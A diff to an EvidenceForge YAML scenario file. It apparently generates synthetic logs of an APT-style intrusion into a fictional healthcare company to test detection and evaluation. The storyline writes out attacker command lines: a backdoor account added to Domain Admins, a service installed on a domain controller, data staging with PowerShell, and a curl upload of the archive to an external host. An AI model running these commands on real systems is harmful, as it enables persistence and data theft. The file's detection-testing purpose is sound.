@@ -1,10 +1,17 @@
-version: "1.0"
+scenario_version: "2.0"
+composition:
+  organization:
+    source: project
+    publisher: davidjbianco
+    name: meridian-healthcare-solutions
+    version: "1.1.0"
 name: iteration-test
 description: |
   Canonical EvidenceForge iteration-test scenario for fast generate/evaluate/fix cycles. It
   preserves the expanded environment and attack narrative while including authored,
-  transport-correlated IDS assertions, sensor-local filtering, and deliberate no-alert cases
-  for broad automated and LLM-as-a-judge quality evaluation.
+  transport-correlated IDS assertions, sensor-local filtering, cross-platform SMB activity,
+  a second domain controller, centralized monitoring, and deliberate no-alert cases for broad
+  automated and LLM-as-a-judge quality evaluation.
   Meridian Healthcare Solutions is a mid-size healthcare IT company providing EHR
   integration services from a corporate HQ with an on-premises data center. The
   storyline compresses an APT-style web-app intrusion, Linux and Windows lateral
@@ -18,117 +25,7 @@ description: |
   representative benign cleartext multipart support upload through the explicit proxy.
 
 environment:
-  description: "Meridian Healthcare Solutions corporate HQ and on-prem data center"
-  domain: "meridianhcs.local"
-
-  timezone:
-    default: "America/Chicago"
-
-  users:
-    - username: lina.nguyen
-      full_name: "Lina Nguyen"
-      email: "lina.nguyen@meridianhcs.com"
-      persona: developer
-      primary_system: WS-LNGUYEN-01
-      groups: ["engineering"]
-      browsing_intensity: heavy
-
-    - username: omar.haddad
-      full_name: "Omar Haddad"
-      email: "omar.haddad@meridianhcs.com"
-      persona: data_analyst
-      primary_system: WS-OHADDAD-01
-      groups: ["analytics"]
-
-    - username: marcus.chen
-      full_name: "Marcus Chen"
-      email: "marcus.chen@meridianhcs.com"
-      persona: sysadmin
-      primary_system: WS-MCHEN-01
-      groups: ["it-admins", "domain-admins"]
-
-    - username: priya.patel
-      full_name: "Priya Patel"
-      email: "priya.patel@meridianhcs.com"
-      persona: security_analyst
-      primary_system: WS-PPATEL-01
-      groups: ["security"]
-
-    - username: evelyn.brooks
-      full_name: "Evelyn Brooks"
-      email: "evelyn.brooks@meridianhcs.com"
-      persona: executive
-      primary_system: WS-EBROOKS-01
-      groups: ["executives"]
-
-    - username: diego.ramirez
-      full_name: "Diego Ramirez"
-      email: "diego.ramirez@meridianhcs.com"
-      persona: accountant
-      primary_system: WS-DRAMIREZ-01
-      groups: ["finance"]
-
-    - username: aisha.johnson
-      full_name: "Aisha Johnson"
-      email: "aisha.johnson@meridianhcs.com"
-      persona: help_desk
-      primary_system: WS-AJOHNSON-01
-      groups: ["it-support"]
-
-    - username: sophia.martinez
-      full_name: "Sophia Martinez"
-      email: "sophia.martinez@meridianhcs.com"
-      persona: sales
-      primary_system: WS-SMARTINEZ-01
-      groups: ["sales"]
-      browsing_intensity: light
-
-  service_accounts:
-    - svc_backup
-    - svc_monitor
-    - svc_mhsync
-    - apache
-    - root
-
-  stale_accounts:
-    - username: jennifer.walsh
-      last_active: "2023-11-15"
-      reason: "Transferred to London office"
-
-  groups:
-    - name: engineering
-      members: ["lina.nguyen"]
-    - name: analytics
-      members: ["omar.haddad"]
-    - name: it-admins
-      members: ["marcus.chen", "aisha.johnson"]
-    - name: domain-admins
-      members: ["marcus.chen"]
-    - name: security
-      members: ["priya.patel"]
-    - name: executives
-      members: ["evelyn.brooks"]
-    - name: finance
-      members: ["diego.ramirez"]
-    - name: sales
-      members: ["sophia.martinez"]
-
   network_identities:
-    - id: ehr_portal
-      hosts: ["ehr-portal.meridianhcs.com"]
-      ips: ["203.14.220.10", "10.10.3.10"]
-      tags: ["web", "dmz", "healthcare"]
-      dns: true
-    - id: corporate_proxy
-      hosts: ["proxy.meridianhcs.com"]
-      ips: ["10.10.3.20"]
-      tags: ["proxy", "infrastructure"]
-      dns: true
-    - id: mail_edge_public
-      hosts: ["mail.meridianhcs.com"]
-      ips: ["203.14.220.11"]
-      tags: ["email", "smtp"]
-      dns: true
     - id: westbridge_services
       hosts:
         - "api.westbridge-services.net"
@@ -150,300 +47,7 @@ environment:
       tags: ["web", "vendor", "support", "external"]
       dns: true
 
-  systems:
-    - hostname: WS-LNGUYEN-01
-      ip: "10.10.1.21"
-      os: "Ubuntu 22.04"
-      type: workstation
-      assigned_user: lina.nguyen
-      services: ["ssh", "systemd-resolved"]
-
-    - hostname: WS-OHADDAD-01
-      ip: "10.10.1.22"
-      os: "Ubuntu 22.04"
-      type: workstation
-      assigned_user: omar.haddad
-      services: ["ssh", "systemd-resolved"]
-
-    - hostname: WS-MCHEN-01
-      ip: "10.10.1.31"
-      os: "Windows 11 Enterprise"
-      type: workstation
-      assigned_user: marcus.chen
-      services: ["dns-client", "w32time"]
-
-    - hostname: WS-PPATEL-01
-      ip: "10.10.1.32"
-      os: "Windows 11 Enterprise"
-      type: workstation
-      assigned_user: priya.patel
-      services: ["dns-client", "w32time"]
-
-    - hostname: WS-EBROOKS-01
-      ip: "10.10.1.33"
-      os: "Windows 10 Enterprise"
-      type: workstation
-      assigned_user: evelyn.brooks
-      services: ["dns-client", "w32time"]
-
-    - hostname: WS-DRAMIREZ-01
-      ip: "10.10.1.34"
-      os: "Windows 10 Enterprise"
-      type: workstation
-      assigned_user: diego.ramirez
-      services: ["dns-client", "w32time"]
-
-    - hostname: WS-AJOHNSON-01
-      ip: "10.10.1.35"
-      os: "Windows 10 Enterprise"
-      type: workstation
-      assigned_user: aisha.johnson
-      services: ["dns-client", "w32time", "remote_desktop"]
-
-    - hostname: WS-SMARTINEZ-01
-      ip: "10.10.1.36"
-      os: "Windows 10 Enterprise"
-      type: workstation
-      assigned_user: sophia.martinez
-      services: ["dns-client", "w32time"]
-
-    - hostname: LT-MRIVERA-02
-      ip: "10.10.1.99"
-      os: "Ubuntu 22.04"
-      type: workstation
-      services: ["dhclient", "ssh"]
-
-    - hostname: DC-01
-      ip: "10.10.2.10"
-      os: "Windows Server 2022"
-      type: domain_controller
-      services: ["ad-ds", "dns", "kerberos", "ldap", "smb", "w32time", "windows-dhcp-server"]
-      roles: ["domain_controller", "dns_server", "dhcp_server"]
-
-    - hostname: FILE-SRV-01
-      ip: "10.10.2.20"
-      os: "Windows Server 2019"
-      type: server
-      services: ["smb", "dns-client", "w32time"]
-      roles: ["file_server"]
-
-    - hostname: MAIL-EDGE-01
-      ip: "10.10.2.25"
-      os: "Ubuntu 22.04"
-      type: server
-      services: ["smtp", "imaps", "postfix", "dovecot", "systemd-resolved"]
-      roles: ["mail_server"]
-
-    - hostname: MAIL-CLIN-01
-      ip: "10.10.2.26"
-      os: "Ubuntu 22.04"
-      type: server
-      services: ["smtp", "imaps", "postfix", "dovecot", "systemd-resolved"]
-      roles: ["mail_server"]
-
-    - hostname: MAIL-FIN-01
-      ip: "10.10.2.27"
-      os: "Windows Server 2022"
-      type: server
-      services: ["smtp", "owa", "imaps", "exchange", "dns-client", "w32time"]
-      roles: ["mail_server"]
-
-    - hostname: WEB-EXT-01
-      ip: "10.10.3.10"
-      os: "Ubuntu 22.04"
-      type: server
-      services: ["apache2", "php-fpm", "ssh", "systemd-resolved"]
-      roles: ["web_server"]
-      public_hostnames: ["ehr-portal.meridianhcs.com"]
-
-    - hostname: PROXY-01
-      ip: "10.10.3.20"
-      os: "Ubuntu 22.04"
-      type: server
-      services: ["squid", "ssh", "systemd-resolved"]
-      roles: ["forward_proxy"]
-      public_hostnames: ["proxy.meridianhcs.com"]
-
-    - hostname: APP-INT-01
-      ip: "10.10.2.30"
-      os: "Ubuntu 22.04"
-      type: server
-      services: ["ssh", "gunicorn", "systemd-resolved"]
-      roles: ["app_server"]
-
-    - hostname: DB-PROD-01
-      ip: "10.10.4.10"
-      os: "CentOS 8"
-      type: server
-      services: ["mysql", "ssh"]
-      roles: ["database"]
-
-  network:
-    public_cidrs: ["203.14.220.0/28"]
-    segments:
-      - name: corporate_lan
-        cidr: "10.10.1.0/24"
-        description: "Corporate workstation network"
-        systems:
-          - WS-LNGUYEN-01
-          - WS-OHADDAD-01
-          - WS-MCHEN-01
-          - WS-PPATEL-01
-          - WS-EBROOKS-01
-          - WS-DRAMIREZ-01
-          - WS-AJOHNSON-01
-          - WS-SMARTINEZ-01
-          - LT-MRIVERA-02
-        exposure: internal
-      - name: server_vlan
-        cidr: "10.10.2.0/24"
-        description: "Internal server VLAN"
-        systems: [DC-01, FILE-SRV-01, MAIL-EDGE-01, MAIL-CLIN-01, MAIL-FIN-01, APP-INT-01]
-        exposure: internal
-      - name: dmz
-        cidr: "10.10.3.0/24"
-        description: "Internet-facing DMZ"
-        systems: [WEB-EXT-01, PROXY-01]
-        exposure: both
-        external_ratio: 0.6
-      - name: database_vlan
-        cidr: "10.10.4.0/24"
-        description: "Database VLAN without a dedicated sensor"
-        systems: [DB-PROD-01]
-        exposure: internal
-    sensors:
-      - type: network
-        name: zeek-core
-        placement: span
-        monitoring_segments: [corporate_lan, server_vlan]
-        direction: bidirectional
-        log_formats: [zeek]
-      - type: network
-        name: zeek-dmz
-        placement: span
-        monitoring_segments: [dmz]
-        direction: bidirectional
-        log_formats: [zeek]
-      - type: ids
-        name: snort-perimeter
-        placement: tap
-        monitoring_segments: [dmz]
-        direction: bidirectional
-        log_formats: [snort_alert]
-      - type: ids
-        name: snort-core
-        placement: span
-        monitoring_segments: [corporate_lan, server_vlan]
-        direction: bidirectional
-        log_formats: [snort_alert]
-      - type: firewall
-        name: fw-perimeter
-        placement: tap
-        monitoring_segments: [corporate_lan, server_vlan, dmz]
-        direction: bidirectional
-        log_formats: [cisco_asa]
-        interfaces:
-          corporate_lan: inside
-          server_vlan: inside
-          dmz: dmz
-        default_action: deny
-        deny_ratio: 2.0
-        drop_mode: drop
-        threat_detection_rate: 10
-        nat_rules:
-          - type: dynamic_pat
-            src: [corporate_lan, server_vlan, dmz]
-            mapped_ip: "203.14.220.1"
-          - type: static
-            src: dmz
-            real_ip: "10.10.3.10"
-            mapped_ip: "203.14.220.10"
-          - type: static
-            src: server_vlan
-            real_ip: "10.10.2.25"
-            mapped_ip: "203.14.220.11"
-        policy:
-          - {src: external, dst: dmz, ports: [80, 443]}
-          - {src: external, dst: server_vlan, ports: [25]}
-          - {src: corporate_lan, dst: any, ports: []}
-          - {src: server_vlan, dst: external, ports: [25, 53, 80, 443]}
-          - {src: server_vlan, dst: server_vlan, ports: []}
-          - {src: dmz, dst: server_vlan, ports: [3306]}
-
-  proxy:
-    mode: explicit
-    listener_port: 8080
-
   email:
-    accepted_domains:
-      - meridianhcs.com
-      - research.meridianhcs.com
-    mail_servers:
-      - name: edge
-        hostname: mail.meridianhcs.com
-        system: MAIL-EDGE-01
-        platform: generic_smtp
-        allow_inbound_starttls: true
-        attempt_outbound_starttls: true
-      - name: clinical
-        hostname: mail-clinical.meridianhcs.com
-        system: MAIL-CLIN-01
-        platform: generic_smtp
-        allow_inbound_starttls: true
-        attempt_outbound_starttls: true
-      - name: finance
-        hostname: mail-fin.meridianhcs.com
-        system: MAIL-FIN-01
-        platform: exchange
-        allow_inbound_starttls: false
-        attempt_outbound_starttls: false
-    default_mailbox_servers: [edge]
-    mailbox_overrides:
-      - group: engineering
-        server: clinical
-      - group: analytics
-        server: clinical
-      - group: finance
-        server: finance
-      - group: executives
-        server: finance
-    outbound_routes:
-      - name: default
-        servers: [edge]
-      - name: clinical-via-edge
-        sender_groups: [engineering, analytics]
-        servers: [clinical, edge]
-        isp_relays:
-          - smtp1.greatplains-mail.net
-          - smtp2.greatplains-mail.net
-      - name: finance-via-edge
-        sender_groups: [finance, executives]
-        servers: [finance, edge]
-    inbound_route: [edge]
-    isp_relays:
-      - relay1.northlake-messaging.net
-      - relay2.northlake-messaging.net
-    distribution_groups:
-      - address: clinical-ops@meridianhcs.com
-        members:
-          - lina.nguyen@meridianhcs.com
-          - omar.haddad@meridianhcs.com
-          - priya.patel@meridianhcs.com
-      - address: finance@meridianhcs.com
-        members:
-          - diego.ramirez@meridianhcs.com
-          - evelyn.brooks@meridianhcs.com
-      - address: it-help@meridianhcs.com
-        members:
-          - aisha.johnson@meridianhcs.com
-          - marcus.chen@meridianhcs.com
-      - address: ehr-release@research.meridianhcs.com
-        members:
-          - lina.nguyen@meridianhcs.com
-          - omar.haddad@meridianhcs.com
-    artifacts:
-      mode: all
-    background_messages_per_user_per_day: 12.0
     corpus: email_corpus.yaml
 
 time_window:
@@ -453,12 +57,6 @@ time_window:
 
 logon_grace_period: "30m"
 observation_profile: enterprise_standard
-
-baseline_activity:
-  description: "Low-volume but varied healthcare IT baseline activity"
-  intensity: low
-  variation: medium
-  suspicious_noise: medium
 
 red_herrings:
   - id: rh-001
@@ -516,6 +114,73 @@ red_herrings:
         technique: "Benign - Package Maintenance"
         description: "Expected APT metadata retrieval that produces a policy false positive"
 
+  - id: rh-007
+    time: "+2h25m"
+    actor: omar.haddad
+    system: WS-OHADDAD-01
+    activity: "Analyst works with ClinicalResearch content through the persistent CIFS mount"
+    explanation: "Omar browses, reads, and updates routine research material; a transient sharing violation provides a benign Linux-to-Samba negative outcome."
+    event_spacing:
+      mode: explicit_offsets
+      offsets: ["0s", "18s", "1m04s", "1m11s"]
+    events:
+      - type: smb_activity
+        operation: browse
+        purpose: interactive
+        target:
+          type: share
+          share: FILE-LNX-01.clinical-research
+          file_ref: model_validation
+        outcome: success
+        path_style: mounted
+        mapping: clinical-research-mnt
+        client_access: cifs_mount
+        auth_protocol: kerberos
+        technique: "Benign - Clinical Analytics"
+        description: "Browse the current model-validation study through /mnt/clinical-research"
+      - type: smb_activity
+        operation: read
+        purpose: interactive
+        target:
+          type: share
+          share: FILE-LNX-01.clinical-research
+          file_ref: model_validation
+        outcome: success
+        path_style: mounted
+        mapping: clinical-research-mnt
+        client_access: cifs_mount
+        auth_protocol: kerberos
+        technique: "Benign - Clinical Analytics"
+        description: "Read the model-validation dataset through the persistent CIFS mount"
+      - type: smb_activity
+        operation: update
+        purpose: interactive
+        target:
+          type: share
+          share: FILE-LNX-01.clinical-research
+          file_ref: pipeline_manifest
+        outcome: success
+        path_style: mounted
+        mapping: clinical-research-mnt
+        client_access: cifs_mount
+        auth_protocol: kerberos
+        technique: "Benign - Clinical Analytics"
+        description: "Update the research pipeline manifest"
+      - type: smb_activity
+        operation: update
+        purpose: interactive
+        target:
+          type: share
+          share: FILE-LNX-01.clinical-research
+          file_ref: pipeline_manifest
+        outcome: sharing_violation
+        path_style: mounted
+        mapping: clinical-research-mnt
+        client_access: cifs_mount
+        auth_protocol: kerberos
+        technique: "Benign - Clinical Analytics"
+        description: "A second save collides with another user's open handle"
+
   - id: rh-004
     time: "+3h32m"
     actor: lina.nguyen
@@ -570,6 +235,164 @@ red_herrings:
         technique: "Benign - Vendor Support"
         description: "Vendor support accepts the multipart diagnostics upload"
 
+  - id: rh-008
+    time: "+3h38m"
+    actor: lina.nguyen
+    system: WS-LNGUYEN-01
+    activity: "Developer publishes an integration artifact to Samba with smbclient"
+    explanation: "Lina uploads a routine build artifact directly, then checks a stale path left in an old runbook."
+    event_spacing:
+      mode: explicit_offsets
+      offsets: ["0s", "42s"]
+    events:
+      - type: smb_activity
+        operation: copy
+        purpose: software
+        source:
+          type: client
+          path: /home/lina.nguyen/build/ehr-connector-2.4.7.tar.gz
+        destination:
+          type: share
+          share: FILE-LNX-01.clinical-research
+          path: 'Integration\Incoming\ehr-connector-2.4.7.tar.gz'
+        outcome: success
+        path_style: unc
+        client_access: smbclient
+        auth_protocol: kerberos
+        technique: "Benign - Software Delivery"
+        description: "Upload a normal integration build to the research share"
+      - type: smb_activity
+        operation: read
+        purpose: software
+        target:
+          type: share
+          share: FILE-LNX-01.clinical-research
+          path: 'Integration\Legacy\ehr-connector-current.tar.gz'
+        outcome: not_found
+        path_style: unc
+        client_access: smbclient
+        auth_protocol: kerberos
+        technique: "Benign - Software Delivery"
+        description: "An obsolete runbook points Lina to a stale artifact path"
+
+  - id: rh-005
+    time: "+4h05m"
+    actor: diego.ramirez
+    system: WS-DRAMIREZ-01
+    activity: "Finance user completes a routine month-end document work burst on the mapped share"
+    explanation: "Diego reviews, edits, creates, and publishes ordinary Finance documents through his persistent F: mapping."
+    event_spacing:
+      mode: explicit_offsets
+      offsets: ["0s", "20s", "1m", "2m", "3m"]
+    events:
+      - type: smb_activity
+        operation: browse
+        purpose: interactive
+        target:
+          type: share
+          share: FILE-SRV-01.finance
+          file_ref: q1_forecast
+        outcome: success
+        path_style: mapped
+        mapping: finance-f
+        technique: "Benign - Finance Operations"
+        description: "Browse the quarter-end working set through F:"
+      - type: smb_activity
+        operation: read
+        purpose: interactive
+        target:
+          type: share
+          share: FILE-SRV-01.finance
+          file_ref: q1_budget
+        outcome: success
+        path_style: mapped
+        mapping: finance-f
+        technique: "Benign - Finance Operations"
+        description: "Open the current quarter budget workbook"
+      - type: smb_activity
+        operation: update
+        purpose: interactive
+        target:
+          type: share
+          share: FILE-SRV-01.finance
+          file_ref: q1_variance
+        outcome: success
+        path_style: mapped
+        mapping: finance-f
+        technique: "Benign - Finance Operations"
+        description: "Save updated variance calculations"
+      - type: smb_activity
+        operation: create
+        purpose: interactive
+        target:
+          type: share
+          share: FILE-SRV-01.finance
+          path: 'Q1\FY24\Working\close-checklist.txt'
+        outcome: success
+        path_style: mapped
+        mapping: finance-f
+        technique: "Benign - Finance Operations"
+        description: "Create a close checklist on the Finance share"
+      - type: smb_activity
+        operation: move
+        purpose: interactive
+        source:
+          type: share
+          share: FILE-SRV-01.finance
+          file_ref: variance_draft
+        destination:
+          type: share
+          share: FILE-SRV-01.finance
+          path: 'Q1\FY24\Published\variance-notes.docx'
+        outcome: success
+        path_style: mapped
+        mapping: finance-f
+        technique: "Benign - Finance Operations"
+        description: "Publish a draft by moving it within the same share"
+
+  - id: rh-009
+    time: "+4h35m"
+    actor: omar.haddad
+    system: WS-OHADDAD-01
+    activity: "Analyst uses smbclient to retrieve a Windows-hosted clinical export"
+    explanation: "Omar bypasses his mount for a one-off direct read of an approved deidentified export, providing a Linux-to-Windows SMB comparison."
+    events:
+      - type: smb_activity
+        operation: read
+        purpose: interactive
+        target:
+          type: share
+          share: FILE-SRV-01.clinical-exports
+          file_ref: deidentified_claims
+        outcome: success
+        path_style: unc
+        client_access: smbclient
+        auth_protocol: ntlmssp
+        technique: "Benign - Clinical Analytics"
+        description: "Read the approved export from the Windows share with NTLMSSP"
+
+  - id: rh-006
+    time: "+4h40m"
+    actor: marcus.chen
+    system: WS-MCHEN-01
+    activity: "Sysadmin retrieves a deidentified audit sample from the encrypted clinical export share"
+    explanation: "Marcus copies an approved deidentified sample for a scheduled access-control review; SMB encryption limits network-layer file visibility."
+    events:
+      - type: smb_activity
+        operation: copy
+        purpose: administrative
+        source:
+          type: share
+          share: FILE-SRV-01.clinical-exports
+          file_ref: deidentified_claims
+        destination:
+          type: client
+          path: 'C:\Users\marcus.chen\Downloads\deidentified-claims-sample.csv'
+        outcome: success
+        path_style: unc
+        technique: "Benign - IT Maintenance"
+        description: "Copy an approved audit sample over an encrypted SMB share"
+
   - id: rh-002
     time: "+5h10m"
     actor: marcus.chen
@@ -591,6 +414,26 @@ red_herrings:
         command_line: "powershell.exe -NoProfile -Command \"Test-Connection FILE-SRV-01 -Count 4\""
         technique: "Benign - IT Maintenance"
         description: "Network diagnostic test"
+
+  - id: rh-010
+    time: "+5h58m"
+    actor: priya.patel
+    system: LOG-MON-01
+    activity: "Security analyst opens a late SSH investigation session on the monitoring server"
+    explanation: "Priya checks recent authentication activity with journalctl; the deliberately unclosed session extends to the collection boundary."
+    event_spacing:
+      mode: explicit_offsets
+      offsets: ["0s", "30s"]
+    events:
+      - type: ssh_session
+        source_ip: "10.10.1.32"
+        technique: "Benign - Security Investigation"
+        description: "SSH from Priya's workstation to the centralized monitoring server"
+      - type: process
+        process_name: /usr/bin/journalctl
+        command_line: '/usr/bin/journalctl --since "10 minutes ago" -u ssh.service --no-pager'
+        technique: "Benign - Security Investigation"
+        description: "Review recent SSH authentication events without closing the session before collection ends"
 
 storyline:
   - id: evt-email-001
@@ -1159,26 +1002,26 @@ storyline:
     events:
       - type: process
         process_name: "C:\\Windows\\System32\\net.exe"
-        command_line: "net user svc_mhsync MhsSvc!2024 /add /domain"
+        command_line: "net user svc_dirsync MhsSvc!2024 /add /domain"
         supplementary: none
         technique: "T1136.002 - Create Account: Domain Account"
         description: "Create backdoor domain account"
       - type: account_created
-        target_username: svc_mhsync
+        target_username: svc_dirsync
         technique: "T1136.002 - Create Account: Domain Account"
-        description: "Domain account svc_mhsync created"
+        description: "Domain account svc_dirsync created"
       - type: process
         process_name: "C:\\Windows\\System32\\net.exe"
-        command_line: "net group \"Domain Admins\" svc_mhsync /add /domain"
+        command_line: "net group \"Domain Admins\" svc_dirsync /add /domain"
         supplementary: none
         technique: "T1098 - Account Manipulation"
         description: "Add backdoor account to privileged group"
       - type: group_member_added
         group_name: "Domain Admins"
-        member_name: svc_mhsync
+        member_name: svc_dirsync
         scope: global
         technique: "T1098 - Account Manipulation"
-        description: "svc_mhsync added to Domain Admins"
+        description: "svc_dirsync added to Domain Admins"
 
   - id: evt-017
     time: "+4h20m"
@@ -1209,6 +1052,33 @@ storyline:
         task_content: "<Task><Actions><Exec><Command>C:\\Windows\\System32\\DeviceSyncSvc.exe</Command></Exec></Actions></Task>"
         technique: "T1053.005 - Scheduled Task/Job: Scheduled Task"
         description: "Scheduled task created"
+
+  - id: evt-017b
+    time: "+4h25m"
+    actor: marcus.chen
+    system: DC-02
+    activity: "Attacker pivots from DC-01 to DC-02 and starts a service under LocalSystem"
+    event_spacing:
+      mode: explicit_offsets
+      offsets: ["0s", "5s", "7s"]
+    events:
+      - type: logon
+        logon_type: 3
+        source_ip: "10.10.2.10"
+        technique: "T1021.002 - Remote Services: SMB/Windows Admin Shares"
+        description: "Network logon to DC-02 from DC-01 with stolen Marcus Chen credentials"
+      - type: service_installed
+        service_name: DirectoryCacheSvc
+        service_file_name: "C:\\Windows\\System32\\DirectoryCacheSvc.exe"
+        service_account: LocalSystem
+        source_ip: "10.10.2.10"
+        technique: "T1569.002 - System Services: Service Execution"
+        description: "Install DirectoryCacheSvc through ordinary Windows remote administration"
+      - type: process
+        process_name: "C:\\Windows\\System32\\DirectoryCacheSvc.exe"
+        command_line: "C:\\Windows\\System32\\DirectoryCacheSvc.exe --service"
+        technique: "T1569.002 - System Services: Service Execution"
+        description: "Start DirectoryCacheSvc as LocalSystem on DC-02"
 
   - id: evt-018
     time: "+4h30m"
@@ -1344,26 +1214,128 @@ storyline:
         description: "DGA-style DNS lookups"
 
   - id: evt-022
+    time: "+4h58m"
+    actor: aisha.johnson
+    system: WS-AJOHNSON-01
+    activity: "Attacker tests the compromised help desk identity against the Finance share"
+    events:
+      - type: smb_activity
+        operation: read
+        purpose: collection
+        target:
+          type: share
+          share: FILE-SRV-01.finance
+          file_ref: q1_forecast
+        outcome: access_denied
+        path_style: unc
+        technique: "T1039 - Data from Network Shared Drive"
+        description: "Denied attempt to read a Finance workbook as the help desk user"
+
+  - id: evt-022b
     time: "+5h01m"
-    actor: svc_mhsync
-    system: FILE-SRV-01
-    activity: "Backdoor account authenticates to FILE-SRV-01 and stages sensitive data"
+    actor: marcus.chen
+    system: WS-AJOHNSON-01
+    activity: "Attacker uses stolen administrator credentials to collect Windows and Samba research data over SMB"
+    event_spacing:
+      mode: explicit_offsets
+      offsets: ["0s", "10s", "11s", "12s", "14s", "16s", "18s", "24s"]
     events:
       - type: logon
-        logon_type: 3
+        logon_type: 9
         source_ip: "10.10.1.35"
-        technique: "T1078 - Valid Accounts"
-        description: "Backdoor account network logon to file server"
-      - type: process
-        process_name: "C:\\Windows\\System32\\net.exe"
-        command_line: "net view \\\\FILE-SRV-01"
-        technique: "T1135 - Network Share Discovery"
-        description: "Enumerate file server shares"
+        technique: "T1078.002 - Valid Accounts: Domain Accounts"
+        description: "Create a new-credentials session for the stolen administrator identity"
       - type: process
         process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-        command_line: "powershell.exe -NoProfile -Command \"Compress-Archive -Path \\\\FILE-SRV-01\\Finance\\Q1\\*,\\\\FILE-SRV-01\\Patients\\Exports\\* -DestinationPath C:\\ProgramData\\Microsoft\\cache_7f3a.zip\""
+        command_line: "powershell.exe -NoProfile -Command \"New-Item -ItemType Directory -Force C:\\ProgramData\\Microsoft\\VaultCache\\Finance,C:\\ProgramData\\Microsoft\\VaultCache\\Clinical,C:\\ProgramData\\Microsoft\\VaultCache\\Research | Out-Null\""
+        supplementary: none
+        technique: "T1059.001 - Command and Scripting Interpreter: PowerShell"
+        description: "Prepare local collection directories under the stolen administrator session"
+      - type: smb_activity
+        operation: browse
+        purpose: collection
+        target:
+          type: share
+          share: FILE-SRV-01.finance
+          file_ref: q1_forecast
+        outcome: success
+        path_style: unc
+        technique: "T1135 - Network Share Discovery"
+        description: "Enumerate Finance content with stolen administrator credentials"
+      - type: smb_activity
+        operation: copy
+        purpose: collection
+        source:
+          type: share
+          share: FILE-SRV-01.finance
+          selector:
+            path_glob: 'Q1\**\*'
+            extensions: [.xlsx, .docx, .pdf]
+            tags_any: [finance]
+        destination:
+          type: client
+          directory: 'C:\ProgramData\Microsoft\VaultCache\Finance\'
+        batch:
+          count: 5
+          duration: "2s"
+        outcome: success
+        path_style: unc
+        technique: "T1039 - Data from Network Shared Drive"
+        description: "Copy a bounded Finance working set to local staging"
+      - type: smb_activity
+        operation: copy
+        purpose: collection
+        source:
+          type: share
+          share: FILE-SRV-01.clinical-exports
+          file_ref: deidentified_claims
+        destination:
+          type: client
+          path: 'C:\ProgramData\Microsoft\VaultCache\Clinical\deidentified-claims-sample.csv'
+        outcome: success
+        path_style: unc
+        technique: "T1039 - Data from Network Shared Drive"
+        description: "Copy a clinical export from an encrypted share to local staging"
+      - type: smb_activity
+        operation: browse
+        purpose: collection
+        target:
+          type: share
+          share: FILE-LNX-01.clinical-research
+          file_ref: model_validation
+        outcome: success
+        path_style: unc
+        client_access: windows_native
+        auth_protocol: kerberos
+        smb_principal: marcus.chen
+        technique: "T1135 - Network Share Discovery"
+        description: "Browse Samba-hosted ClinicalResearch content with stolen credentials"
+      - type: smb_activity
+        operation: copy
+        purpose: collection
+        source:
+          type: share
+          share: FILE-LNX-01.clinical-research
+          selector:
+            tags_any: [research]
+        destination:
+          type: client
+          directory: 'C:\ProgramData\Microsoft\VaultCache\Research\'
+        batch:
+          count: 3
+          duration: "2s"
+        outcome: success
+        path_style: unc
+        client_access: windows_native
+        auth_protocol: kerberos
+        smb_principal: marcus.chen
+        technique: "T1039 - Data from Network Shared Drive"
+        description: "Copy selected ClinicalResearch files from Samba to local staging"
+      - type: process
+        process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        command_line: "powershell.exe -NoProfile -Command \"Compress-Archive -Path C:\\ProgramData\\Microsoft\\VaultCache\\Finance\\*,C:\\ProgramData\\Microsoft\\VaultCache\\Clinical\\*,C:\\ProgramData\\Microsoft\\VaultCache\\Research\\* -DestinationPath C:\\ProgramData\\Microsoft\\cache_7f3a.zip\""
         technique: "T1560.001 - Archive Collected Data: Archive via Utility"
-        description: "Compress staged finance and patient data"
+        description: "Compress locally staged Finance, clinical export, and Samba research data"
 
   - id: evt-023
     time: "+5h15m"
@@ -1391,6 +1363,30 @@ storyline:
         technique: "T1105 - Ingress Tool Transfer"
         description: "Copy archive back to app server"
 
+  - id: evt-023b
+    time: "+5h19m"
+    actor: root
+    system: APP-INT-01
+    activity: "Root uses smbclient with the synchronization account to stage the database archive on Samba"
+    events:
+      - type: smb_activity
+        operation: copy
+        purpose: collection
+        source:
+          type: client
+          path: /tmp/.cache/rpt_0318.sql.gz
+        destination:
+          type: share
+          share: FILE-LNX-01.clinical-research
+          path: 'Integration\DB-Staging\rpt_0318.sql.gz'
+        outcome: success
+        path_style: unc
+        client_access: smbclient
+        auth_protocol: ntlmssp
+        smb_principal: svc_mhsync
+        technique: "T1039 - Data from Network Shared Drive"
+        description: "Stage the database dump while preserving distinct local actor, SMB principal, and Samba identity"
+
   - id: evt-024
     time: "+5h20m"
     actor: aisha.johnson
@@ -1403,10 +1399,21 @@ storyline:
 
   - id: evt-025
     time: "+5h25m"
-    actor: aisha.johnson
+    actor: marcus.chen
     system: WS-AJOHNSON-01
-    activity: "Upload compressed archive to external staging domain over HTTPS"
+    activity: "Attacker uses curl.exe in the stolen administrator session to upload the archive over HTTPS"
+    event_spacing:
+      mode: explicit_offsets
+      offsets: ["0s", "2s"]
     events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\curl.exe"
+        command_line: >-
+          C:\Windows\System32\curl.exe --proxy http://10.10.3.20:8080
+          -F "archive=@C:\ProgramData\Microsoft\cache_7f3a.zip;type=application/zip"
+          https://api.westbridge-services.net/upload/telemetry/7f3a2b19
+        technique: "T1041 - Exfiltration Over C2 Channel"
+        description: "Read and submit the staged ZIP with the Windows curl client"
       - type: connection
         dst_ip: "45.33.32.30"
         dst_port: 443
@@ -1415,11 +1422,19 @@ storyline:
         method: POST
         uri: "/upload/telemetry/7f3a2b19"
         status_code: 200
-        user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36"
-        orig_bytes: 314782613
-        resp_bytes: 2048
+        user_agent: "curl/8.4.0"
+        request_multipart:
+          media_type: multipart/form-data
+          parts:
+            - name: archive
+              body_len: 18782613
+              local_source_path: 'C:\ProgramData\Microsoft\cache_7f3a.zip'
+              filename: cache_7f3a.zip
+              content_type: application/zip
+              detected_mime_type: application/zip
+        response_body_len: 2048
         technique: "T1041 - Exfiltration Over C2 Channel"
-        description: "Upload staged archive"
+        description: "Upload the 18,782,613-byte staged archive through the explicit proxy"
 
   - id: evt-026
     time: "+5h30m"
@@ -1533,14 +1548,34 @@ storyline:
     events:
       - type: process
